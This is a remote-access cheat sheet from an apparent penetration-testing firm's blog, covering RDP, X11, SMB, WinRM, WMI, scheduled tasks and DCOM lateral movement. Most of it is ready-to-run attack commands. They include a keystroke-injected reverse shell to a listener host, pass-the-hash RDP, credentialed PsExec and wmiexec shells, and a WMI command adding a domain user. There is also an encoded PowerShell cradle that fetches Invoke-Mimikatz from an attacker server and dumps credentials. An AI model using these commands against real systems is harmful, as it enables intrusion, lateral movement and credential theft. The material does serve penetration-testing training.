## Remote Access Cheatsheet

[source](https://dolosgroup.io/blog/remote-access-cheat-sheet)

Delos Group

![table.png](https://images.squarespace-cdn.com/content/v1/596932869f7456a7012e900c/1525292707986-TRS8UZTDDH7OL3G1A3UG/table.png?format=1500w)

* * *

## Remote Desktop Protocol (RDP)

RDP is Microsoft's built-in remote desktop solution that ships with all versions of Windows. The service is not listening by default, but it is commonplace to enable it in corporate environments.

**Port:** 3389/TCP

**Tools:** Microsoft Remote Desktop Client (Windows/Mac), rdesktop, xfreerdp

**Examples:**

- ```
      C:\Windows\System32\mstsc.exe 
    ```
    
- ```
      rdesktop -g 80% 192.168.112.200
    ```
    
- ```
      xfreerdp /u:josh /d:testlab /pth:64f12cddaa88057e06a81b54e73b949b /v:192.168.112.200
    ```
    

* * *

## Virtual Network Computing (VNC)

VNC was created as a vendor agnostic graphical desktop solution and is widely deployed in *nix environments. Historically it was commonly deployed without authentication. Modern servers strongly urge administrators to configure a password.

**Port:** 5900/TCP

**Tools:** The plethora of open-source VNC applications, RealVNC, TightVNC, Screen Sharing (Mac)

**Examples:**

- ```
      vncviewer
    ```
    

* * *

## Apple Remote Desktop (ARD)

ARD is Apple's graphical remote desktop solution. The service is not listening by default, and in our experience it is not widely deployed.

**Port:** 3283/UDP (v1), 5900/TCP (v2)

**Tools:** Screen Sharing, VNC applications

**Examples:**

- ```
      /System/Library/CoreServices/Screen Sharing.app 
    ```
    
- ```
      vncviewer
    ```
    

* * *

## Xorg

The Xorg Foundation create and maintain's the widely deployed X11 windowing system used in most *nix environments. Most administrators are aware that the client-server model allows forwarding of X-sessions over SSH tunnels; however, when configured to allow TCP sessions, the X-session can be attached to remotely. The default X11 configuration was changed to disallow TCP sessions several years ago, but we still see it from time to time. If you see TCP 6000+N open, you can likely execute code on that machine or remotely log keystrokes.

**Port:** 6000+N/TCP, (or 22/TCP via SSH)

**Tools:** xspy, xwatchwin, xwd, xvkbd, ssh, MSF, xrdp.py

**Example screenshot:**

```
xwd -root -screen -silent -display 192.168.37.146:0 > screenshot.xwd 
```

**Example keyboard injection:**

```
xvkbd -no-repeat -no-sync -no-jump-pointer -remote-display 192.168.37.146:0 -text "/bin/bash -i > /dev/tcp/192.168.37.101/8000<&1 2>&1\r" 
```

**Example remote keylog:**

```
xspy 192.168.1.1
```

* * *

## System Center Configuration Manager (SCCM) Remote Control

SCCM is often used in enterprise networks to handle patch deployment for workstations and servers, as well as help facilitate installation of applications to groups of managed systems. When configured through the administration console, managed systems can be configured to start a remote control service (System Center Remote Control). While it provides similar functionality to RDP, it does not leverage Terminal Services, and in certain configurations can allow full control of a remote system without alerting logged-on users to the session hijack.

**Port:** 2701/TCP

**Tools:** [CmRcViewer.exe](/s/RemoteControl.zip), SCCM Admin console

Note: If you are not inclined to download a random executable from the Internet(duh), the SCCM Remote Control client can be found at \*C:\\Program Files (x86)\\Microsoft Configuration Manager\\AdminConsole\\bin\\i386\* after installing SCCM. Be warned, setting up an SCCM lab is unfathomably complicated.

* * *

## Telnet

Modern operating systems no longer leverage telnet, but we still see it on almost every pentest on embedded devices, or legacy systems. The old skool command line console access operates as a cleartext protocol and has largely been replaced by SSH.

**Port:** 23/TCP

**Tools:** Telnet, Netcat (nc), Ncat

**Examples:**

- ```
      telnet 192.168.1.1
    ```
    
- ```
      nc 192.168.1.1 23
    ```
    
- ```
      ncat 192.168.1.1 23
    ```
    

* * *

## RLogin/Rsh

The Berkeley alternate to the Telnet standard was used on *nix systems for decades before being replaced by SSH. Rather than requiring user/password auth, administrators could specify source machines that were considered authenticated via a .rhosts file. Rlogin is an interactive shell, similar to telnet. Rsh can be used to execute a single command.

**Port:** 512-514/TCP

**Tools:** rlogin, rsh, remsh, rexec, rcp

**Examples:**

- ```
      rlogin -l josh 192.168.1.1
    ```
    
- ```
      rsh -l josh 192.168.1.1 "ping -c4 192.168.1.2"
    ```
    

* * *

## Secure Shell (SSH)

It's everywhere in the *nix world, and has a ton of features built in that us attackers can leverage for pivoting, tunneling X-sessions, file transfers, etc..

**Port:** 22/TCP

**Tools:** ssh, PuTTY

**Examples:**

- ```
      ssh root@192.168.1.1
    ```
    

* * *

## Server Message Block (SMB)

SMB has been leveraged for file administration on Windows and *nix systems for decades. Another feature often abused by attackers is the use of administrative shares (C$, ADMIN$, IPC$) to push a service binary to a target machine, then start the service for semi-interactive I/O. SysInternalsSuite includes the PsExec binary which is largely credited for developing and leveraging this technique. Local administrative privileges are required to push the service binary to the ADMIN$ share, after which an RPC/SVCCTL call creates and starts the remote control service. IPC$ is leveraged to create named pipes for input and output which act as a semi-interactive shell.

**Port:** 445/TCP (SMB), 135/TCP (RPC), High-random port

**Tools:** PsExec,exe, psexec.py (impacket), winexe, MSF, smbexec

**Examples:**

- ```
      PsExec.exe \\192.168.1.1 -u josh -p Password1 cmd.exe 
    ```
    
- ```
      winexe --system --uninstall -U testlab/josh%Password1 //192.168.112.200 cmd.exe
    ```
    
- ```
      psexec.py 'josh':'Password1'@192.168.112.200 cmd.exe
    ```
    
- ```
      smbexec.py 'josh':'Password1'@192.168.112.200 cmd.exe
    ```
    

* * *

## Windows Remote Management (WinRM)

WinRM was Microsoft's implementation of the open WS-Management standard for SOAP-based remote management. Microsoft includes several standalone tools (winrm, winrs) and is also the underlying technology used for PowerShell Remoting. Under the surface, WinRM makes use of WMI queries, but can also leverages the IPMI driver for hardware management. It's a terribly powerful tool, albeit not a widely deployed yet due to its relative infancy.

**Port:** 5985/TCP (HTTP), 5986/TCP (HTTPS)

**Tools:** winrm, winrs, PowerShell Remoting

**Example list services:**

```
winrm get wmicimv2/Win32_Service –r:192.168.112.20
```

**Example execute ipconfig (or any other code):**

```
winrs /r:WIN-DEHIB5FROC2 /u:josh /p:Password1 ipconfig
```

**Example PSRemote cmdlet on remote system:**

```
PS> Invoke-Command 192.168.112.200 {Get-Service *}
```

**Example PSRemote interactive PS Session:**

```
PS> Enter-PSSession -ComputerName 192.168.112.200 -Credential testlab\josh
PS> ...
PS> Exit-PSSession 
```

* * *

## Windows Management Instrumentation (WMI)

WMI is Microsoft's consolidation of system management under a single umbrella. It is leveraged heavily under the hood for local operation, but can also be used for remote execution. Several built-in tools exist for either WQL query execution, or full code execution. Impacket includes wmiexec which also provides a semi-interactive shell.

Remote WMI queries used RPC/DCOM as the communication bus.

**Port:** 135/TCP (RPC), plus one high-random TCP (DCOM)

**Tools:** winrm, winrs, PowerShell Remoting

**Example list services:**

```
wmic.exe /USER:"testlab\josh" /PASSWORD:"Password1" /NODE:192.168.112.200 service get "startname,pathname"
```

**Example execute code (add user):**

```
wmic /USER:"testlab\josh" /PASSWORD:"Password1" /NODE:192.168.112.200 process call create "net user hacker Str0nGP_$sw0rd /add /domain"
```

**Example list services (via PS cmdlet):**

```
PS> Get-WMIObject -ComputerName 192.168.112.200 -query "Select * from Win32_Service" 
```

**Example list processes (via linux wmic util):**

```
pth-wmic -U testlab/josh%Password1 //192.168.112.200 "select csname,name,processid,sessionid from win32_process"
```

**Example semi-interactive shell (impacket):**

```
wmiexec.py 'josh':'Password1'@192.168.112.200
```

* * *

## Scheduled Tasks

Tasks, that are, scheduled. In addition to running commands locally, the built-in schtasks utility leverages RPC/DCOM to schedule tasks on remote machines. On legacy Windows machines At.exe performed this functionality, but was deprecated for SchTasks in modern platforms. Application firewalls that block Schtasks may still allow At, a good reason to attempt both if necessary.

**Port:** 135/TCP (RPC), plus one high-random TCP (DCOM)

**Tools:** schtasks, at

**Examples:**

- ```
      schtasks.exe /Create /S 192.168.112.200 /U testlab\josh /P Password1 /TR "C:\Windows\System32\win32calc.exe" /TN "pwnd" /SC ONCE /ST 20:05
    ```
    
- ```
      at.exe \\192.168.112.200 20:25 cmd /c "C:\Windows\System32\win32calc.exe"
    ```
    

* * *

## Microsoft Management Console (MMC2.0) Application Class

In 2017, Matt Nelson released [research](https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/) into methods for lateral movement using DCOM. We strongly urge you to review his research for full details (it's worth the read). Reviewing all the intricacies of DCOM is outside the scope of what can/should be covered in a "cheat sheet", but leave it to say the MMC2.0 application class can be accessed remotely over RPC/DCOM, and exports the ExecuteShellCommand method which can be used to... Execute..a..Shell..Command.

MMC requires local admin due to the nature of the application, and will be blocked by the default firewall rules. BUT, we've seen enough networks that disable host firewalls to make good use of this technique.

**Port:** 135/TCP (RPC), plus one high-random TCP (DCOM)

**Tools:** native .NET calls on Windows

**Example code execution:**

```
PS> $com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application","192.168.112.200"))
PS> $com.Document.ActiveView.ExecuteShellCommand("C:\Windows\System32\calc.exe",$null,$null,"7")
```

**Example Invoke-Mimikatz** (listener started on 192.168.112.132:8000)**:**

```
PS> [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes("IEX (New-Object Net.WebClient).DownloadString('http://192.168.112.132:8000/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds > C:\\Users\\josh\\Desktop\\mimi.txt"))

PS> $com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application","192.168.112.200"))
PS> $com.Document.ActiveView.ExecuteShellCommand("C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",$null,"-enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADEAMQAyAC4AMQAzADIAOgA4ADAAMAAwAC8ASQBuAHYAbwBrAGUALQBNAGkAbQBpAGsAYQB0AHoALgBwAHMAMQAnACkAOwAgAEkAbgB2AG8AawBlAC0ATQBpAG0AaQBrAGEAdAB6ACAALQBEAHUAbQBwAEMAcgBlAGQAcwAgAD4AIABDADoAXABcAFUAcwBlAHIAcwBcAFwAagBvAHMAaABcAFwARABlAHMAawB0AG8AcABcAFwAbQBpAG0AaQAuAHQAeAB0AA==","7") 
```

* * *

## ShellWindows Object

A few weeks after his initial research on MMC lateral movement, Matt Nelson published more research targeting DCOM objects that lacked an explicit LaunchPermission attribute. Read his post [here](https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/) for a thorough review of the techniques shown below.

Successful auth over RPC is required; however, regardless of privilege the code will execute as a child of the explore.exe process with limited privileges. No scaping memory directly with this method.. :(

**Port:** 135/TCP (RPC), plus one high-random TCP (DCOM)

**Tools:** native .NET calls on Windows

When invoking .NET calls in this fashion, the existing auth token is used. Great for lateral movement from a compromised system, but not if you are remotely accessing a target machine with recovered credentials. The simplest method we have found is to create a new PS Session with runas.

**Example auth:**

```
PS> runas /netonly /user:TESTLAB\josh "powershell.exe" 
```

**Example code execution:**

```
PS> $com = [Type]::GetTypeFromCLSID('9BA05972-F6A8-11CF-A442-00A0C90A8F39',"192.168.112.200")
PS> $obj = [System.Activator]::CreateInstance($com)
PS> $item = $obj.Item()
PS> $item.Document.Application.ShellExecute("cmd.exe","/c calc.exe","c:\windows\system32",$null,0) 
```

**Example: call shutdown routine (user prompted for confirmation):**

```
PS> $com = [Type]::GetTypeFromCLSID('9BA05972-F6A8-11CF-A442-00A0C90A8F39',"192.168.112.200")
PS> $obj = [System.Activator]::CreateInstance($com)
PS> $item = $obj.Item()
PS> $item.Document.Application.ShutDownWindows()
```

**Example troll: launch IE with Sloths in Space (10 hours):**

```
PS> $com = [Type]::GetTypeFromCLSID('9BA05972-F6A8-11CF-A442-00A0C90A8F39',"192.168.112.200")
PS> $obj = [System.Activator]::CreateInstance($com)
PS> $item = $obj.Item()
PS> $item.Document.Application.ShellExecute("iexplore.exe","https://www.youtube.com/watch?v=AaxQhNBBSkM","C:\Program Files\Internet Explorer",$null,"1")
```

* * *

## ShellBrowserWindow Object

Functionally the same as the previous method, the ShellBrowserWindow object can be leverage for remote code execution over DCOM

**Port:** 135/TCP (RPC), plus one high-random TCP (DCOM)

**Tools:** native .NET calls on Windows

When invoking .NET calls in this fashion, the existing auth token is used. Great for lateral movement from a compromised system, but not if you are remotely accessing a target machine with recovered credentials. The simplest method we have found is to create a new PS Session with runas.

**Example auth:**

```
PS> runas /netonly /user:TESTLAB\josh "powershell.exe" 
```

**Example code execution:**

```
PS> $com = [Type]::GetTypeFromCLSID('C08AFD90-F2A1-11D1-8455-00A0C91F3880',"192.168.112.200")
PS> $obj = [System.Activator]::CreateInstance($com)
PS> $obj.Document.Application.ShellExecute("cmd.exe","/c calc.exe","c:\windows\system32",$null,0)
```